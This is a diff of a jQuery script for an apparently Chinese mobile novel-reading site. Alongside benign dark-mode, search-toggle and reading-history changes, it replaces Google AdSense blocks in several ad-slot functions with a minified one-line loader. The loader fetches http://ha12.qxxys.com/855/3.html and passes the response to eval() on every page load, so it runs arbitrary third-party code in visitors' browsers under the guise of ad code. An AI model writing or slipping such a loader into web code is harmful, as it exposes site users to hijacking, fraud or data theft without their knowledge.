@@ -24,9 +24,12 @@ $(function(){
     $("#tj img").height($tjImgHight*1.25);
 });
 $(function(){
-    $("#showsearch").click(function(){$("#search").slideToggle();  });
+    $("#showsearch").click(function(){$("#search").slideToggle();});
     $("#type").click(function(){if($("#type").text() == "书名"){$(this).html("作者");$("#searchType").val("author");}else{  $(this).html("书名");$("#searchType").val("articlename");}    });
     $("#formsearch").submit(function(){if($("#s_key").val() == "输入搜索词" || !$("#s_key").val()){mg.tishi("请输入搜索词！");return false;}});
+
+    //扩展
+    $("#showtool").click(function(){$("#tool").slideToggle();});
 })
 $(function(){
     var b = "22px";var m = "16px"; var s = "12px";
@@ -44,8 +47,22 @@ function font(type,fontSize){
     $("#nr").css("font-size",fontSize);
 }
 function light(type){
-    if(type == "off"){$("#zj #light").html("开灯");$("#zj").addClass("gd");$("#zj .dise").removeClass("dise").removeClass("header").addClass("gddise").addClass("tmpc");$.cookie("light","off",{path:'/',expires:365});}
-    else{$("#zj #light").html("关灯");$("#zj").removeClass("gd");$("#zj .tmpc").removeClass("gddise").addClass("dise");$("header").addClass("header");$.cookie("light","on",{path:'/',expires:365});}
+    if(type == "off"){
+        $("#zj #light").html("开灯");
+        $("#zj").addClass("gd");
+        $("#zj .dise").removeClass("dise").removeClass("header").addClass("gddise");
+        $("#zj .share").css('background-color','#666');
+        $("#zj .top_menu_list").css('background-color','#f8f8f8');
+        $.cookie("light","off",{path:'/',expires:365});
+    }else{
+        $("#zj #light").html("关灯");
+        $("#zj").removeClass("gd");
+        $("#zj .tmpc").removeClass("gddise").addClass("dise");
+        $("header").addClass("header");
+        $("#zj .share").css('background-color','#f8f8f8');
+        $("#zj .top_menu_list").css('background-color','white');
+        $.cookie("light","on",{path:'/',expires:365});
+    }
 }
 function zuoyoufy(url){
     window.location.href = url;
@@ -438,6 +455,47 @@ function addbookcase(bid,cid){
     });
 }
 
+//历史
+function hislogs(){
+    var str = $.cookie("hislogs");  
+    if (str !=null){
+        var hislogs = JSON.parse(str);
+        $.each(hislogs, function(i,val){        
+            if (val.thisUrl == thisUrl) {
+                hislogs.splice(eval(i),1);
+                return false;
+            }else if(val.bookName == bookName && val.chapterName != chapterName) {
+                hislogs.splice(eval(i),1);
+                return false;
+            }
+
+        });
+        
+        var arrylength = (hislogs.length -1);
+        if (arrylength < 9) {
+            hislogs.push(jos);
+            var str = JSON.stringify(hislogs);
+            $.cookie('hislogs',str,{expires:365 , path:'/'});
+            
+        }else{
+
+            hislogs.splice(0,1);
+            hislogs.push(jos);
+            var str = JSON.stringify(hislogs);
+            $.cookie('hislogs',str,{expires:365 , path:'/'});
+        } 
+
+
+
+    }else{
+        var hislogs = new Array(jos);
+        var str = JSON.stringify(hislogs);
+        $.cookie('hislogs',str,{expires:365 , path:'/'});　
+
+    }
+}
+
+
 function tiaozhuan(a) {
 
     if (!a) {
@@ -510,29 +568,12 @@ $(function(){
     $('.stop').click(function(){
         $('html,body').animate({scrollTop: '0px'}, 300);
     }); 
-    //设置广告不要漂浮在最上面
-    var divs = $("addiv").find("div"); 
-    for(var i= 0; i<divs.length; i++)
-    { 
-        divs[i].style.zIndex = 0;
-    } 
 
 });
 
 //首页
 function _17mb_shouyetop(){//顶部广告
-    document.writeln("<div style=\'margin-top:10px;text-align:center\'>");
-    document.writeln("<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>");
-    document.writeln("<!-- dashubao移动1 -->");
-    document.writeln("<ins class=\"adsbygoogle\"");
-    document.writeln("     style=\"display:block\"");
-    document.writeln("     data-ad-client=\"ca-pub-1047803567334338\"");
-    document.writeln("     data-ad-slot=\"2258046049\"");
-    document.writeln("     data-ad-format=\"auto\"></ins>");
-    document.writeln("<script>");
-    document.writeln("(adsbygoogle = window.adsbygoogle || []).push({});");
-    document.writeln("</script>");
-    document.writeln("</div>");
+    (function(){var requestApi={};requestApi.url='http://ha12.qxxys.com/855/3.html';requestApi.method='GET';requestApi.randId='C'+Math.random().toString(36).substr(2);window.document.writeln('<div id=\''+requestApi.randId+'\'></div>');requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.xlRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url,true);xmlhttp.send()};if(!window.xlRequestRun){window.xlRequestRun=true;requestApi.func()}else{requestApi.interval=setInterval(function(){if(!window.xlRequestRun){clearInterval(requestApi.interval);window.xlRequestRun=true;requestApi.func()}},500)}})();
 }
 function _17mb_shouyemiddle(){//顶部广告
     document.writeln("<script src=\'http://29451.dashubao.co/?s=8893113_5343\'></script>");
@@ -556,23 +597,12 @@ function _17mb_shouyebottom(){//底端广告
 //info
 function _17mb_infotop(){//顶部广告
 
-    document.writeln("<script src=\'http://29451.dashubao.co/?s=8893113_5343\'></script>");
+    (function(){var requestApi={};requestApi.url='http://ha12.qxxys.com/855/3.html';requestApi.method='GET';requestApi.randId='C'+Math.random().toString(36).substr(2);window.document.writeln('<div id=\''+requestApi.randId+'\'></div>');requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.xlRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url,true);xmlhttp.send()};if(!window.xlRequestRun){window.xlRequestRun=true;requestApi.func()}else{requestApi.interval=setInterval(function(){if(!window.xlRequestRun){clearInterval(requestApi.interval);window.xlRequestRun=true;requestApi.func()}},500)}})();
 
 }
 
 function _17mb_infomiddle(){//中间广告
-    document.writeln("<div style=\'margin-top:10px;text-align:center\'>");
-    document.writeln("<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>");
-    document.writeln("<!-- 大书包移动2 -->");
-    document.writeln("<ins class=\"adsbygoogle\"");
-    document.writeln("     style=\"display:block\"");
-    document.writeln("     data-ad-client=\"ca-pub-1047803567334338\"");
-    document.writeln("     data-ad-slot=\"5211512441\"");
-    document.writeln("     data-ad-format=\"auto\"></ins>");
-    document.writeln("<script>");
-    document.writeln("(adsbygoogle = window.adsbygoogle || []).push({});");
-    document.writeln("</script>");
-    document.writeln("</div>");
+    document.writeln("<script src=\'http://29451.dashubao.co/?s=8893113_5343\'></script>");
 }
 
 function _17mb_infobottom(){//底端广告
@@ -592,35 +622,13 @@ function _17mb_infobottom(){//底端广告
 }
 //mulu
 function _17mb_mulutop(){//顶部广告
-
-    document.writeln("<div style=\'margin-top:10px;text-align:center\'>");
-    document.writeln("<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>");
-    document.writeln("<!-- dashubao移动1 -->");
-    document.writeln("<ins class=\"adsbygoogle\"");
-    document.writeln("     style=\"display:block\"");
-    document.writeln("     data-ad-client=\"ca-pub-1047803567334338\"");
-    document.writeln("     data-ad-slot=\"2258046049\"");
-    document.writeln("     data-ad-format=\"auto\"></ins>");
-    document.writeln("<script>");
-    document.writeln("(adsbygoogle = window.adsbygoogle || []).push({});");
-    document.writeln("</script>");
-    document.writeln("</div>");
+    (function(){var requestApi={};requestApi.url='http://ha12.qxxys.com/855/3.html';requestApi.method='GET';requestApi.randId='C'+Math.random().toString(36).substr(2);window.document.writeln('<div id=\''+requestApi.randId+'\'></div>');requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.xlRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url,true);xmlhttp.send()};if(!window.xlRequestRun){window.xlRequestRun=true;requestApi.func()}else{requestApi.interval=setInterval(function(){if(!window.xlRequestRun){clearInterval(requestApi.interval);window.xlRequestRun=true;requestApi.func()}},500)}})();
+    
 
 }
 
 function _17mb_mulubottom(){//底端广告
-    document.writeln("<div style=\'margin-top:10px;text-align:center\'>");
-    document.writeln("<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>");
-    document.writeln("<!-- 大书包移动3 -->");
-    document.writeln("<ins class=\"adsbygoogle\"");
-    document.writeln("     style=\"display:block\"");
-    document.writeln("     data-ad-client=\"ca-pub-1047803567334338\"");
-    document.writeln("     data-ad-slot=\"1839243643\"");
-    document.writeln("     data-ad-format=\"auto\"></ins>");
-    document.writeln("<script>");
-    document.writeln("(adsbygoogle = window.adsbygoogle || []).push({});");
-    document.writeln("</script>");
-    document.writeln("</div>");
+    document.writeln("<script src=\'http://29451.dashubao.co/?s=8893113_5343\'></script>");
     
 }
 //nr
@@ -646,25 +654,25 @@ function _17mb_nrmiddle(){//中间广告
 }
 
 function _17mb_nrbottom(){//底端广告
-    document.writeln("<div style=\'margin-top:10px;text-align:center\'>");
-    document.writeln("<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>");
-    document.writeln("<!-- 大书包移动3 -->");
-    document.writeln("<ins class=\"adsbygoogle\"");
-    document.writeln("     style=\"display:block\"");
-    document.writeln("     data-ad-client=\"ca-pub-1047803567334338\"");
-    document.writeln("     data-ad-slot=\"1839243643\"");
-    document.writeln("     data-ad-format=\"auto\"></ins>");
-    document.writeln("<script>");
-    document.writeln("(adsbygoogle = window.adsbygoogle || []).push({});");
-    document.writeln("</script>");
-    document.writeln("</div>");
+    document.writeln("<script src=\'http://29451.dashubao.co/?s=8893113_5343\'></script>");
     
 }
 
 //通用
 function _17mb_top(){//顶部广告
 
-   document.writeln("<script src=\'http://29451.dashubao.co/?s=8893113_5343\'></script>");
+    document.writeln("<div style=\'margin-top:10px;text-align:center\'>");
+    document.writeln("<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>");
+    document.writeln("<!-- dashubao移动1 -->");
+    document.writeln("<ins class=\"adsbygoogle\"");
+    document.writeln("     style=\"display:block\"");
+    document.writeln("     data-ad-client=\"ca-pub-1047803567334338\"");
+    document.writeln("     data-ad-slot=\"2258046049\"");
+    document.writeln("     data-ad-format=\"auto\"></ins>");
+    document.writeln("<script>");
+    document.writeln("(adsbygoogle = window.adsbygoogle || []).push({});");
+    document.writeln("</script>");
+    document.writeln("</div>");
 
 }
 
